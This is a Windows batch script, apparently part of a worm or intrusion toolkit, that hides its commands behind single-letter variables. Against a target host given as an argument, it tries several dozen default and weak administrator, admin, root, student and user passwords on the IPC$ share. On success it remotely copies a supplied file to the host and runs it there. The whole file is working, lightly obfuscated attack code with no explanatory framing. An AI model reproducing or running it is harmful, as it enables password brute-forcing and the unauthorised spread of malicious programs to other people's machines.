@ECHO OFF
set F=u
set Z=s
set B=n
set L=e
set U=t
set G=e
set R=p
set H=d
set N=a
set t=if not errorlevel 1 goto
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "xxyyzz" /user:administrator
%t% bluesc4n29
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "abc" /user:admin
%t% bluesc4n30
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "student" /user:student
%t% bluesc4n31
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "teacher" /user:teacher
%t% bluesc4n32
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "" /user:user
%t% bluesc4n33
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "user" /user:user
%t% bluesc4n34
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "test" /user:test
%t% bluesc4n4
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "test123" /user:administrator
%t% bluesc4n5
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "1" /user:administrator
%t% bluesc4n26
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "123" /user:administrator
%t% bluesc4n27
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "12345" /user:admin
%t% bluesc4n28
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "temp" /user:administrator
%t% bluesc4n6
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "" /user:administrator
%t% bluesc4n1
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "" /user:administrator
%t% bluesc4n35
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "Administrator" /user:administrator
%t% bluesc4n2
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "Administrator" /user:administrator
%t% bluesc4n37
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "test" /user:administrator
%t% bluesc4n3
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "admin" /user:administrator
%t% bluesc4n10
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "temp123" /user:administrator
%t% bluesc4n7
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "pass" /user:administrator
%t% bluesc4n8
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "password" /user:administrator
%t% bluesc4n9
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "root" /user:root
%t% bluesc4n11
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "changeme" /user:administrator
%t% bluesc4n12
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "admin" /user:admin
%t% bluesc4n13
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "123456" /user:administrator
%t% bluesc4n14
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "654321" /user:administrator
%t% bluesc4n15
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "abc123" /user:administrator
%t% bluesc4n16
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "12345" /user:administrator
%t% bluesc4n36
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "red123" /user:administrator
%t% bluesc4n17
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "admin123" /user:administrator
%t% bluesc4n18
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "qwerty" /user:administrator
%t% bluesc4n19
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "asdf" /user:administrator
%t% bluesc4n20
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "password123" /user:administrator
%t% bluesc4n21
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "secret" /user:administrator
%t% bluesc4n22
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "qwertyuiop" /user:administrator
%t% bluesc4n23
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "12345" /user:administrator
%t% bluesc4n24
%B%%L%%U% %F%%Z%%G% \\%1\ipc$ "54321" /user:administrator
%t% bluesc4n25
goto bluesc4nend
:bluesc4n1
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "" -d %2 -o
goto bluesc4nend
:bluesc4n10
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "admin" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "admin" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "admin" -d %2 -o
goto bluesc4nend
:bluesc4n2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "administrator" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "administrator" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "administrator" -d %2 -o
goto bluesc4nend
:bluesc4n37
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "Administrator" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "Administrator" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "Administrator" -d %2 -o
goto bluesc4nend
:bluesc4n11
%F%%R%%H%%N%%U%%L% \\%1 -u root -p "root" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u root -p "root" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u root -p "root" -d %2 -o
goto bluesc4nend
:bluesc4n13
%F%%R%%H%%N%%U%%L% \\%1 -u admin -p "admin" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u admin -p "admin" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u admin -p "admin" -d %2 -o
goto bluesc4nend
:bluesc4n3
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "test" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "test" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "test" -d %2 -o
goto bluesc4nend
:bluesc4n4
%F%%R%%H%%N%%U%%L% \\%1 -u test -p "test" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u test -p "test" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u test -p "test" -d %2 -o
goto bluesc4nend
:bluesc4n5
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "test123" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "test123" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "test123" -d %2 -o
goto bluesc4nend
:bluesc4n6
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "temp" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "temp" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "temp" -d %2 -o
goto bluesc4nend
:bluesc4n7
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "temp123" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "temp123" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "temp123" -d %2 -o
goto bluesc4nend
:bluesc4n8
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "pass" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "pass" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "pass" -d %2 -o
goto bluesc4nend
:bluesc4n9
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "password" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "password" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "password" -d %2 -o
goto bluesc4nend
:bluesc4n12
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "changeme" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "changeme" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "changeme" -d %2 -o
goto bluesc4nend
:bluesc4n14
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "123456" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "123456" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "123456" -d %2 -o
goto bluesc4nend
:bluesc4n15
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "654321" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "654321" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "654321" -d %2 -o
goto bluesc4nend
:bluesc4n16
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "abc123" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "abc123" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "abc123" -d %2 -o
goto bluesc4nend
:bluesc4n17
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "red123" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "red123" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "red123" -d %2 -o
goto bluesc4nend
:bluesc4n18
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "admin123" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "admin123" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "admin123" -d %2 -o
goto bluesc4nend
:bluesc4n19
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "qwerty" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "qwerty" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "qwerty" -d %2 -o
goto bluesc4nend
:bluesc4n20
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "asdf" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "asdf" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "asdf" -d %2 -o
goto bluesc4nend
:bluesc4n21
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "password123" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "password123" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "password123" -d %2 -o
goto bluesc4nend
:bluesc4n22
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "secret" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "secret" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "secret" -d %2 -o
goto bluesc4nend
:bluesc4n23
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "qwertyuiop" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "qwertyuiop" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "qwertyuiop" -d %2 -o
goto bluesc4nend
:bluesc4n24
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "12345" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "12345" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "12345" -d %2 -o
goto bluesc4nend
:bluesc4n25
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "54321" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "54321" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "54321" -d %2 -o
goto bluesc4nend
:bluesc4n26
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "1" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "1" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "1" -d %2 -o
goto bluesc4nend
:bluesc4n27
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "123" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "123" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "123" -d %2 -o
goto bluesc4nend
:bluesc4n28
%F%%R%%H%%N%%U%%L% \\%1 -u admin -p "12345" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u admin -p "12345" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u admin -p "12345" -d %2 -o
goto bluesc4nend
:bluesc4n29
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "xxyyzz" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "xxyyzz" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "xxyyzz" -d %2 -o
goto bluesc4nend
:bluesc4n30
%F%%R%%H%%N%%U%%L% \\%1 -u admin -p "abc" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u admin -p "abc" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u admin -p "abc" -d %2 -o
goto bluesc4nend
:bluesc4n31
%F%%R%%H%%N%%U%%L% \\%1 -u student -p "student" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u student -p "student" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u student -p "student" -d %2 -o
goto bluesc4nend
:bluesc4n32
%F%%R%%H%%N%%U%%L% \\%1 -u teacher -p "teacher" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u teacher -p "teacher" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u teacher -p "teacher" -d %2 -o
goto bluesc4nend
:bluesc4n33
%F%%R%%H%%N%%U%%L% \\%1 -u user -p "" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u user -p "" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u user -p "" -d %2 -o
goto bluesc4nend
:bluesc4n34
%F%%R%%H%%N%%U%%L% \\%1 -u user -p "user" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u user -p "user" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u user -p "user" -d %2 -o
goto bluesc4nend
:bluesc4n35
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "" -d %2 -o
goto bluesc4nend
:bluesc4n36
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "12345" -d attrib.exe -r %2
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "12345" -f -c -d %2 -o
%F%%R%%H%%N%%U%%L% \\%1 -u administrator -p "12345" -d %2 -o
goto bluesc4nend
:bluesc4nend